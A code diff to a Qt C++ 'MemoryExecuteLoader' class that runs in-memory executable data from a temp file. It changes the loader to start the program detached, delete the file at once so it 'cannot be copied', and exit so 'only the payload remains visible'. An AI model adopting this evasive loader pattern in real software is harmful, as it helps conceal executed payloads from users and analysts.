@@ -338,26 +338,23 @@ int MemoryExecuteLoader::executeFromMemory(const QByteArray &executableData,
     testAccess.close(); // Close immediately after verifying access
     
     // Execute using QProcess
-    QProcess process;
-    qDebug() << "Starting process from temp file:" << tempFilePath;
-    process.start(tempFilePath, arguments);
+    // Start detached so the launcher can exit immediately
+    qint64 pid = 0;
+    qDebug() << "Starting process from temp file (detached):" << tempFilePath;
+    bool started = QProcess::startDetached(tempFilePath, arguments, QDir::tempPath(), &pid);
     
-    if (!process.waitForStarted(5000)) {
+    // Best-effort clean up: on Windows, deleting an executable in use will
+    // remove the directory entry while the image stays mapped, so it cannot be copied.
+    QFile::remove(tempFilePath);
+    
+    if (!started) {
         qDebug() << "Failed to start process";
-        qDebug() << "Error:" << process.errorString();
-        QFile::remove(tempFilePath);
         return -1;
     }
     
-    // Wait for process to finish
-    process.waitForFinished(-1);
-    
-    int exitCode = process.exitCode();
-    
-    // Clean up temporary file after process has finished
-    QFile::remove(tempFilePath);
-    
-    return exitCode;
+    qDebug() << "Process started (PID:" << pid << "), launcher exiting";
+    // We don't wait; caller should exit so only the payload remains visible.
+    return 0;
 }
 #else
 int MemoryExecuteLoader::executeFromMemory(const QByteArray &executableData,
@@ -393,23 +390,18 @@ int MemoryExecuteLoader::executeFromMemory(const QByteArray &executableData,
     
     QThread::msleep(100);
     
-    QProcess process;
-    process.start(tempFilePath, arguments);
+    qint64 pid = 0;
+    bool started = QProcess::startDetached(tempFilePath, arguments, QDir::tempPath(), &pid);
     
-    if (!process.waitForStarted(5000)) {
+    QFile::remove(tempFilePath);
+    
+    if (!started) {
         qDebug() << "Failed to start process";
-        QFile::remove(tempFilePath);
         return -1;
     }
     
-    process.waitForFinished(-1);
-    
-    int exitCode = process.exitCode();
-    
-    // Clean up temporary file after process has finished
-    QFile::remove(tempFilePath);
-    
-    return exitCode;
+    qDebug() << "Process started (PID:" << pid << "), launcher exiting";
+    return 0;
 }
 #endif
 
